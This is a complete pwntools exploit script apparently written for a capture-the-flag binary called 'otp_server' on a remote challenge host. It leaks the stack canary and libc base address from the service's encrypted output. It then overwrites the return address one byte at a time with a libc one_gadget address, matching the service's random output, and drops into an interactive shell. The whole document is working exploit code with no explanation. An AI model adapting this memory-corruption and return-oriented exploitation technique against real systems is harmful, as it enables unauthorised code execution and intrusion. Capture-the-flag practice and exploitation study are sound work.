from pwn import *

libc = ELF("./libc-2.27.so")
e = ELF("./otp_server")
#p = process(e.path)
p = remote("challenges.fbctf.com", 1338)

def key(val):
  p.sendlineafter(">", "1")
  p.sendafter(":", val + ("" if len(val) == 0x108 else "\n"))
def msg(val):
  p.sendlineafter(">", "2")
  p.sendafter(":", val + ("" if len(val) == 0x100 else "\n"))
key("B" * 4 + "B" * (0x18 - 1))
msg("A" * 256)

p.recvuntil("BEGIN ROP")
p.recvline()

print("{:#x}".format(u32(p.recvuntil("BBB\x00")[:4]) ^ 0x42424242))
enc = p.recvline(keepends=False)

stck_chk = u64(enc[0:8])
libc_base = u64(enc[16:24]) + 0x00007f92bfdb0000  - 0x7f92bfdd1b97


print("{:#x}".format(stck_chk))
print("{:#x}".format(libc_base))


def write(val):
  i = 0
  while i < 8:
    key("B" * 4 + "B" * (0x10 + i) + "\x00")
    msg("A" * 256)
    
    p.recvuntil("BEGIN ROP")
    p.recvline()
    line = p.recvuntil("END ROP")
    rng = u32(line[:4]) ^ 0x42424242
    
    if p64(rng)[0] == val[i]:
      i += 1
    
      print("Writing {}".format(i))

write(p64(libc_base + 0x10a38c))

p.sendlineafter(">", "3")

p.interactive()
